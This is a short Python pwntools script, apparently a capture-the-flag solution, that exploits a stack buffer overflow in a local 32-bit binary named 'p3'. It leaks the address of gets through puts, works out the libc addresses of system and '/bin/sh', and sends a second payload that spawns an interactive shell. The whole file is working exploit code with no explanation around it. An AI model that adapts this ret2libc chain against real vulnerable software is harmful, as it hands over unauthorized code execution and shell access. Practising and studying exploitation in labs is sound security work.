#!/usr/bin/env python
# coding=utf-8

from pwn import *
raw_input('#')
p=process('p3')
gdb.attach(p)
context.log_level='debug'
elf=ELF('./p3')
libc=ELF('/lib32/libc.so.6')

main=0x0804849d
pr=0x08048339
puts_plt=elf.symbols['puts']
gets_got=elf.got['gets']

payload1='a'*22+p32(puts_plt)+p32(pr)+p32(gets_got)+p32(main)
#payload1='a'*22+p32(puts_plt)+p32(main)+p32(gets_got)
p.sendline(payload1)
p.recvuntil('\x0a')
t=p.recv()[0:4]
gets=u32(t)
print 'gets addr==>'+hex(gets)
gets_libc=libc.symbols['gets']

system_libc=libc.symbols['system']
binsh_libc=next(libc.search('/bin/sh'))
system=gets+system_libc-gets_libc
binsh=gets+binsh_libc-gets_libc

print 'system addr==>'+hex(system)
print 'binsh addr==>'+hex(binsh)
payload2='a'*22+p32(system)+p32(main)+p32(binsh)
p.sendline(payload2)
p.interactive()

